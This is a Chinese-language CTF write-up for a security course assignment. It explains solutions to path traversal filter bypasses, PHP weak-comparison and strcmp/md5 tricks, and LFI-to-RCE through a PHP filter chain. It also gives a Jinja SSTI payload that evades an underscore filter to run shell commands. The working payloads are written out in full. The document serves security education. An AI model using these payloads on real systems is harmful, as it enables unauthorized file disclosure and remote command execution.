---
title: "【網路安全實務與社會實踐】作業二 Write-up"
published: 2025-03-26T00:00:00.000Z
description: ""
tags: []
category: "general"
draft: false
---
# 作業二 Write-up by owl_d
### pathwalker-waf2
發現這題的path traversal重點在這個區間
```mar=
<?php
      if (isset($_GET['page'])) {
        $safe_path = str_replace('../', '', $_GET['page']);
        echo file_get_contents("./page/".$safe_path.".php");
      }      
    ?>
```
程式只有把 ../ 換掉
所以可以使用 ..././ 的方式來 bypass
..././ 被換掉後會變成 ../ 就一樣可以達成回到上一層的目的

`https://chall.nckuctf.org:28142/?page=..././..././..././..././var/www/html/flag`
即取得flag

p.s. 這題沒辦法用 ..%2f 的方式來bypass，會被當成 ../ 過濾掉

<!--more-->

### swirl
Stage 1: 
```mar=
<?php
include('config.php');
echo '<h1>👻 Stage 1 / 4</h1>';

$A = $_GET['A'];
$B = $_GET['B'];

highlight_file(__FILE__);
echo '<hr>';

if (isset($A) && isset($B))
    if ($A != $B)
        if (strcmp($A, $B) == 0)
            if (md5($A) === md5($B))
                echo "<a href=$stage2>Go to stage2</a>";
            else die('ERROR: MD5(A) != MD5(B)');
        else die('ERROR: strcmp(A, B) != 0');
    else die('ERROR: A == B');
else die('ERROR: A, B should be given');
```
弱型態比較，可以使用 md5(array型態) = NULL 的性質來達成
payload: `?A[]=1&B[]=2`



Stage 2:
```mar=
<?php
include('config.php');
echo '<h1>👻 Stage 2 / 4</h1>';

$A = $_GET['A'];
$B = $_GET['B'];

highlight_file(__FILE__);
echo '<hr>';

if (isset($A) && isset($B))
    if ($A !== $B){
        $is_same = md5($A) == 0 and md5($B) === 0;
        if ($is_same)
            echo (md5($B) ? "QQ1" : md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2");
        else die('ERROR: $is_same is false');
    }
else die('ERROR: A, B should be given');
```
關鍵點應該在這：
`md5($B) ? "QQ1" : md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2"`
看起來有點複雜，但我們可以一部分一部分拆開來看
`md5($B) ? "QQ1" : (目標要到這邊)` 
可以看出來 b 必須得是 false，才能繼續往下
進到下一層後，
`md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2"`
所以 md5($A) 必須得是0
整理一下條件：
1. A 和 B 的值必須不同
2. md5(A) 和 md5(B) 都必須等於 0
3. md5(B) 必須為假值

payload: `?A[]=1&B[]=2`


有趣的事：
意外發現 payload: `?A=true&B=false` 也行得通
可是我自己做了實驗
![image](https://hackmd.io/_uploads/rJX2pUxTJg.png)
發現程式根本就應該跳到 QQ1 就算 QQ1 被調過了應該也要跳去 QQ2
到現在我還是不懂是什麼神奇的機制繞過的，我再研究看看


Stage 3:
.. 會變成 .
那 .... 就會變成 .. 了！
payload: `....\config.php`
(記得要打開網頁原始碼看！)
![image](https://hackmd.io/_uploads/Hkv_1tA31e.png)

Stage 4:
寫完這題發現 LCI 轉 RCE 真的是天才般的發現，太神了
先觀察題目source，會發現主要漏洞在：

1. 使用了 extract($_POST) 函數，直接將 POST 請求中的參數轉換為變數
2. 未經過濾的 include($👀) 語句，允許包含任意文件

所以先試了一下 POST 👀=/etc/passwd：
發現真的有回傳內容，代表 LFI 行得通
![image](https://hackmd.io/_uploads/B1P8D8gpkg.png)


可是 👀=/flag 或者  👀=../../../flag.php 等等直接取 flag 的方式全部失敗
所以勢必得要 RCE 才能印出 flag 了

這次攻擊主要採用 PHP filter chain 來達成
https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md
指令：`python3 php_filter_chain_generator.py --chain "<?php system('cat /flag*'); ?>"`
送到 POST 的 👀 後面變取得 flag

p.s. 最後我還用了 `python3 php_filter_chain_generator.py --chain "<?php system('ls /'); ?>"`
回頭再看一下爲什麼當初試了快 5 個小時的 ../../flag.php 不管用
最後也看到了 flag 檔案有加後綴，所以 path traversal 其實不管用
![image](https://hackmd.io/_uploads/S1r4DUe6yx.png)



### SSTI-waf1
一開始先送送看 `{{7*7}}` 發現真的回應 49
那肯定得是個 SSTI 了！

![image](https://hackmd.io/_uploads/B1xZc0yT1x.png)
從source發現題目會擋掉 _ 底線
所以把底線用 `\5f` 來繞過
並且用 `attr` 代替 點 來做串接

一開始先用ls / 看根目錄有沒有值得注意的檔案
`{{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls /')|attr('read')() }}`
發現網頁回應：
![image](https://hackmd.io/_uploads/Sk3ycRJ6kx.png)


有 flag 檔案，cat 一下便可以得到解答
payload: 
`{{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() }}`


